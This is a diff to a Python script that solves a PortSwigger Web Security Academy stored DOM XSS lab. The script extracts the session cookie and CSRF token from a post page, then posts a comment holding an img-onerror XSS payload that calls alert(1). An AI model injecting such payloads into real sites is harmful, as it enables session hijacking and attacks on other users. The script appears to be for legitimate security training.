@@ -1,16 +1,16 @@
-################################################################################
+##################################################################################
 #
 # Author: Ahmed Elqalaawy (@elqal3awii)
 #
-# Date: 14/11/2023
+# Date: 20/11/2023
 #
-# Lab: Stored XSS into HTML context with nothing encoded
+# Lab: Stored DOM XSS
 #
 # Steps: 1. Fetch a post page
 #        2. Extract the session cookie and the csrf token to post a comment
 #        3. Post a comment with the injected payload in the comment field
 #
-################################################################################
+##################################################################################
 
 
 ###########
@@ -25,7 +25,7 @@ import re
 #########
 
 # change this to your lab URL
-url = "https://0afb005103faa98580a73fc3006700a5.web-security-academy.net"
+url = "https://0a5500c3043ec04483f27ed100e30027.web-security-academy.net"
 
 try:  
     # fetch a post page
@@ -46,7 +46,7 @@ csrf = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]
 print(Fore.WHITE + "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. " + Fore.GREEN + "OK")
 
 # payload to call the alert function
-payload = "<script>alert(1)</script>"
+payload = "><<img src=1 onerror=alert(1)>"
 
 # data to send via POST
 data = {
@@ -68,6 +68,15 @@ try:
 
 except:
     print(Fore.RED + "[!] Failed to post a comment with the injected payload in the comment field through exception")
+    exit(1)
+
+try:
+    # fetch the post page with the injected payload
+    # this request is just for marking the lab as solved
+    requests.get(f"{url}/post?postId=1")
+
+except:
+    print(Fore.RED + "[!] Failed to fetch the post page with the injected payload")
     exit(1)
 
 print(Fore.WHITE + "⦗3⦘ Posting a comment with the injected payload in the comment field.. " + Fore.GREEN + "OK")
